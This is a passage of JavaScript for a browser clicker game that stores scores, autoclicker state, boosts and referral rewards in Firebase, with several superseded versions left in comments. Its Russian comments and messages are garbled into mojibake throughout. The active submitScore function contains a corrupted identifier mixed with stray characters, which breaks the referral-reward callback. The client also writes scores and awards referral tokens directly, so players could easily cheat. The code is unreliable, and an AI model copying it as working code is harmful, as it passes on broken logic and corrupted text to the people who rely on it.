      if (isAnimating) return; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∞–Ω–∏–º–∞—Ü–∏—è —É–∂–µ –∏–¥—ë—Ç
        isAnimating = true;
      
  score += clickPower;
  totalClicks++;
  updateTaskProgress("clickMarathon", 1);
  updateTaskProgress("collectTokens", clickPower); // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
  updateTaskProgress("collectBigTokens", clickPower);
  updateTaskProgress("clickMasterWeekly", 1);    
  checkAchievements();
  updateCounterDisplay();
  updateProfilePanel();
  animateCounter();

// –ê–Ω–∏–º–∞—Ü–∏—è —á–∞—Å—Ç–∏—Ü (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, —Ç—Ä–µ–±—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, particles.js)
  const button = document.getElementById("mainClickButton");
  button.classList.add("pulse");
 // setTimeout(() => button.classList.remove("pulse"), 200);
setTimeout(() => {
    button.classList.remove("pulse");
    isAnimating = false; // –†–∞–∑—Ä–µ—à–∞–µ–º —Å–ª–µ–¥—É—é—â—É—é –∞–Ω–∏–º–∞—Ü–∏—é
  }, 200);
      
      
}


    

    function animateCounter() {
      const counter = document.getElementById('counter');
      counter.classList.add('bounce');
      setTimeout(() => {
        counter.classList.remove('bounce');
      }, 200);
    }

    function checkAchievements() {
      if (!achievements.superClicker && totalClicks >= 10000) {
        achievements.superClicker = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      if (!achievements.tokenHoarder && score >= 1000000) {
        achievements.tokenHoarder = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      if (!achievements.level5 && currentLevel >= 5) {
        achievements.level5 = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }
    }

    function saveAchievements() {
      if (!user) return;
      db.ref("achievements/" + user.uid).set(achievements);
    }

    function toggleShop() {
      const shop = document.getElementById("shop");
      const btn = document.getElementById("shopBtn");
      const isCurrentlyOpen = shop.style.display === "block";

      closeAllPanels();

      shop.style.display = isCurrentlyOpen ? "none" : "block";
      btn.innerHTML = isCurrentlyOpen ? "Shop ‚ñº" : "Shop ‚ñ≤";
    }

  /*!  function startAutoclicker(duration) {
      if (autoclickActive) {
        const remainingTime = Math.max(0, autoclickEndTime - Date.now());
        autoclickEndTime = Date.now() + remainingTime + duration;
        clearInterval(autoclickInterval);
      } else {
        autoclickActive = true;
        autoclickEndTime = Date.now() + duration;
      }

      autoclickInterval = setInterval(() => clickToken(), 1000);
      autoclickerUses++;
      checkAchievements();

      updateProfilePanel();
      submitScore();

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: true,
          autoclickEndTime: autoclickEndTime,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error saving autoclicker state:", error);
        });
      }

      setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
    }!*/

/*!!    function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      // –ï—Å–ª–∏ –≤—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      stopAutoclicker();
    } else if (extendTime) {
      // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–∞–≥—Ä–∞–¥—ã –∑–∞ –∑–∞–¥–∞–Ω–∏–µ
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      // –ó–∞–º–µ–Ω—è–µ–º —Ç–µ–∫—É—â–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–æ–≤—ã–º –≤—Ä–µ–º–µ–Ω–µ–º (–ø–æ–∫—É–ø–∫–∞ –∏–ª–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ)
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    // –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => clickToken(), 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á—ë—Ç—á–∏–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–æ–≤–æ–π –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ (–Ω–µ –ø—Ä–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–∏)
  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1); // –£—á–∏—Ç—ã–≤–∞–µ–º –∞–∫—Ç–∏–≤–∞—Ü–∏—é –¥–ª—è –∑–∞–¥–∞–Ω–∏—è
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}!!*/// pravilniy


/*!!function startAutoclicker(duration, extendTime = false) {
    if (autoclickActive) {
      const remainingTime = Math.max(0, autoclickEndTime - Date.now());
      if (remainingTime <= 0) {
        stopAutoclicker();
      } else if (extendTime) {
        autoclickEndTime = Date.now() + remainingTime + duration;
        clearInterval(autoclickInterval);
        autoclickInterval = setInterval(() => {
          clickToken();
          updateTaskProgress("collectTokens", clickPower);
        }, 1000);
        setTimeout(() => stopAutoclicker(), remainingTime + duration);
      } else {
        autoclickEndTime = Date.now() + duration;
        clearInterval(autoclickInterval);
        autoclickInterval = setInterval(() => {
          clickToken();
          updateTaskProgress("collectTokens", clickPower);
        }, 1000);
        setTimeout(() => stopAutoclicker(), duration);
      }
    } else {
      autoclickActive = true;
      autoclickEndTime = Date.now() + duration;
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }

    if (extendTime || duration !== (autoclickEndTime - Date.now())) {
      autoclickerUses++;
      checkAchievements();
      updateTaskProgress("autoclickerMaster", 1);
    }

    updateProfilePanel();
    submitScore();

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error saving autoclicker state:", error);
      });
    }
  }!!*/

function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      stopAutoclicker();
    } else if (extendTime) {
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => {
      clickToken();
      updateTaskProgress("collectBigTokens", clickPower);
    }, 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1);
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}
    
  

    function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;
  autoclickCooldown = false;
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error updating autoclicker state:", error);
    });
  }
}

   /*! function loadPlayerData(uid) {
      db.ref("leaderboard/" + uid).once("value").then(snapshot => {
        const data = snapshot.val();
        if (data) {
          score = data.score || 0;
          clickPower = data.clickPower || 1;
          autoclickActive = data.autoclickActive || false;
          autoclickEndTime = data.autoclickEndTime || 0;
          const lastUpdate = data.lastUpdate || 0;

          // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
          const tempBoostActive = data.tempBoostActive || false;
          const tempBoostEndTime = data.tempBoostEndTime || 0;
          const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
          const tempBoostAmount = data.tempBoostAmount || 0;

          if (tempBoostActive && tempBoostEndTime > Date.now()) {
            clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
            const remainingDuration = tempBoostEndTime - Date.now();
            originalClickPower = tempBoostOriginalClickPower;
            boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
          } else if (tempBoostActive) {
            clickPower = tempBoostOriginalClickPower;
            db.ref("leaderboard/" + uid).update({
              tempBoostActive: false,
              tempBoostEndTime: 0,
              tempBoostOriginalClickPower: 0,
              tempBoostAmount: 0,
              clickPower: clickPower,
              lastUpdate: Date.now()
            });
          }

          // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
          if (autoclickActive && autoclickEndTime > Date.now()) {
            const elapsedTime = Date.now() - lastUpdate;
            const secondsPassed = Math.floor(elapsedTime / 1000);
            const tokensEarned = secondsPassed * clickPower;
            if (tokensEarned > 0) {
              score += tokensEarned;
              showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
            }
            const remainingTime = autoclickEndTime - Date.now();
            startAutoclicker(remainingTime);
            document.getElementById("autoclickBtn").disabled = true;
          } else if (autoclickActive) {
            autoclickActive = false;
            autoclickEndTime = 0;
            db.ref("leaderboard/" + uid).update({
              autoclickActive: false,
              autoclickEndTime: 0
            });
            stopAutoclicker();
          }

          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          renderAchievements();
          updateClickPowerCostText();
        }

        // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
        if (user) {
          db.ref("leaderboard/" + uid).update({
            lastUpdate: Date.now()
          });
        }
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
      });

      db.ref("achievements/" + uid).once("value").then(snapshot => {
        const data = snapshot.val();
        if (data) {
          achievements = data;
          renderAchievements();
        }
      });
    }!*/

     /*!!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();
        originalClickPower = tempBoostOriginalClickPower;
        boostClickPowerTemporarily(tempBoostAmount, remainingDuration);
      } else if (tempBoostActive) {
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!!*/

function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null; // –ó–∞–≥—Ä—É–∂–∞–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞
      user.referral_bonus_claimed = data.referral_bonus_claimed || false; // –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–ª–∞–≥ –±–æ–Ω—É—Å–∞
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –±—É—Å—Ç–∞
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ—Å—Ç–∞–≤—à–µ–≥–æ—Å—è –≤—Ä–µ–º–µ–Ω–∏
        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();

          // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        // –ï—Å–ª–∏ –±—É—Å—Ç –∏—Å—Ç—ë–∫, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –µ–≥–æ
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
          updateTaskProgress("collectTokens", tokensEarned); // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}


   /*!!! function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    lastUpdate: Date.now(),
    referrer_uid: user.referrer_uid || null
  }).then(() => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ä–µ—Ñ–µ—Ä–µ—Ä
    db.ref(`leaderboard/${user.uid}/referrer_uid`).once('value').then(snapshot => {
      const referrerUid = snapshot.val();
      if (referrerUid) {
        db.ref(`referrals/${referrerUid}/${user.uid}`).update({
          tokens_earned: score,
          lastUpdate: Date.now()
        }).then(() => {
          // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∏–≥ –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1000 —Ç–æ–∫–µ–Ω–æ–≤
          if (score >= 1000) {
            db.ref(`referrals/${referrerUid}/${user.uid}`).once('value').then(refSnapshot => {
              const refData = refSnapshot.val();
              if (refData && !refData.reward_claimed) {
                // –ù–∞—á–∏—Å–ª—è–µ–º 1000 —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–µ–º—É
                db.ref(`leaderboard/${referrerUid}/score`).transaction(currentScore => {
                  return (currentScore || 0) + 1000;
                }).then(() => {
                  showMessage('Referral reward: +1000 tokens!');
                  // –û—Ç–º–µ—á–∞–µ–º –Ω–∞–≥—Ä–∞–¥—É –∫–∞–∫ –ø–æ–ª—É—á–µ–Ω–Ω—É—é
                  db.ref(`referrals/${referrerUid}/${user.uid}`).update({
                    reward_claimed: true
                  });
                });
              }
            });
          }
        });
      }
    });
  }).catch(error => {
    console.error('Error saving score:', error);
    showMessage('Failed to save progress.');
  });
}!!!*/


function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    referrer_uid: user.referrer_uid || null,
    referral_bonus_claimed: user.referral_bonus_claimed || false,
    lastUpdate: Date.now()
  }).then(() => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ä–µ—Ñ–µ—Ä–µ—Ä
    if (user.referrer_uid) {
      db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
        tokens_earned: score,
        lastUpdate: Date.now()
      }).then(() => {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∏–≥ –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1000 —Ç–æ–∫–µ–Ω–æ–≤
        if (score >= 1000) {
          db.ref(`referrals/${user.referrer_uid}/${user.uid}`).once('value').then(refÊ∏ÖÁ©∫Snapshot => {
            const refData = refSnapshot.val();
            if (refData && !refData.reward_claimed) {
              // –ù–∞—á–∏—Å–ª—è–µ–º 1000 —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–µ–º—É
              db.ref(`leaderboard/${user.referrer_uid}/score`).transaction(currentScore => {
                return (currentScore || 0) + 1000;
              }).then(() => {
                showMessage('Referral reward: +1000 tokens!');
                // –û—Ç–º–µ—á–∞–µ–º –Ω–∞–≥—Ä–∞–¥—É –∫–∞–∫ –ø–æ–ª—É—á–µ–Ω–Ω—É—é
                db.ref(`referrals/${user.referrer_uid}/${user.uid}`).update({
                  reward_claimed: true
                });
              });
            }
          });
        }
      });
    }
  }).catch(error => {
    console.error('Error saving score:', error);
    showMessage('Failed to save progress.');
  });
}

      
  

   /*! function submitScore() {
      if (!user) return;
      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
      db.ref("leaderboard/" + user.uid).set({
        id: user.uid,
        name: userName,
        score: score,
        clickPower: clickPower,
        autoclickActive: autoclickActive,
        autoclickEndTime: autoclickEndTime,
        tempBoostActive: !!tempBoostTimeout,
        tempBoostEndTime: tempBoostTimeout ? autoclickEndTime : 0,
        tempBoostOriginalClickPower: originalClickPower || clickPower,
        tempBoostAmount: clickPower - (originalClickPower || clickPower),
        lastUpdate: Date.now()

       referrer_uid: user.referrer_uid || null
  }).then(() => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ä–µ—Ñ–µ—Ä–µ—Ä
    db.ref(`leaderboard/${user.uid}/referrer_uid`).once('value').then(snapshot => {
      const referrerUid = snapshot.val();
      if (referrerUid) {
        db.ref(`referrals/${referrerUid}/${user.uid}`).update({
          tokens_earned: score,
          lastUpdate: Date.now()
        }).then(() => {
          // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∏–≥ –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1000 —Ç–æ–∫–µ–Ω–æ–≤
          if (score >= 1000) {
            db.ref(`referrals/${referrerUid}/${user.uid}`).once('value').then(refSnapshot => {
              const refData = refSnapshot.val();
              if (refData && !refData.reward_claimed) {
                // –ù–∞—á–∏—Å–ª—è–µ–º 1000 —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≥–ª–∞—à–∞—é—â–µ–º—É
                db.ref(`leaderboard/${referrerUid}/score`).transaction(currentScore => {
                  return (currentScore || 0) + 1000;
                }).then(() => {
                  showMessage('Referral reward: +1000 tokens!');
                  // –û—Ç–º–µ—á–∞–µ–º –Ω–∞–≥—Ä–∞–¥—É –∫–∞–∫ –ø–æ–ª—É—á–µ–Ω–Ω—É—é
                  db.ref(`referrals/${referrerUid}/${user.uid}`).update({
                    reward_claimed: true
                  });
                });
              }
            });
          }
        });
      }
    });

        
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
        showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
      });
    }!*/



 /*!!  function submitScore() {
  if (!user) return;
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName,
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    tempBoostActive: !!tempBoostTimeout,
    tempBoostEndTime: tempBoostTimeout ? (Date.now() + (tempBoostEndTime || 0)) : 0,
    tempBoostOriginalClickPower: originalClickPower || clickPower,
    tempBoostAmount: clickPower - (originalClickPower || clickPower),
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á—ë—Ç–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
  });
}!!*/

    

    function buyUpgrade(type) {
      const cost = getClickPowerUpgradeCost();
      if (type === "clickPower") {
        if (clickPower >= 8) {
          showMessage("Click Power is at maximum!");
          return;
        }

        const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
        if (clickPower >= 3 && currentLevel < clickPower + 1) {
          showMessage(`Reach player level ${clickPower + 1} to upgrade Click Power further!`);
          const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");
          buyButton.style.animation = "shake 0.3s";
          setTimeout(() => buyButton.style.animation = "", 300);
          return;
        }

        if (score >= cost) {
          score -= cost;
          clickPower++;
          updateCounterDisplay();
          updateClickPowerBar();
          updateProfilePanel();
          updateClickPowerCostText();
          submitScore();
          showMessage("Click Power upgraded!");
        } else {
          showMessage("Not enough tokens for upgrade.");
        }
      }
    }

  /*!  function buyAutoclicker(minutes) {
      if (autoclickCooldown) {
        showMessage("Autoclicker on cooldown.");
        return;
      }

      const prices = {
        1: 200,
        5: 800,
        10: 1400
      };

      const cost = prices[minutes];
      if (score >= cost) {
        score -= cost;
        updateCounterDisplay();
        showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
        autoclickCooldown = true;
        autoclickActive = true;
        const duration = minutes * 60000;
        startAutoclicker(duration);
        updateTaskProgress("autoclickerMaster", 1);

        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            autoclickActive: true,
            autoclickEndTime: autoclickEndTime,
            score: score,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("Error saving autoclicker purchase:", error);
          });
        }

        updateProfilePanel();
        submitScore();
      } else {
        showMessage("Not enough tokens for autoclicker.");
      }
    }!*/

function buyAutoclicker(minutes) {
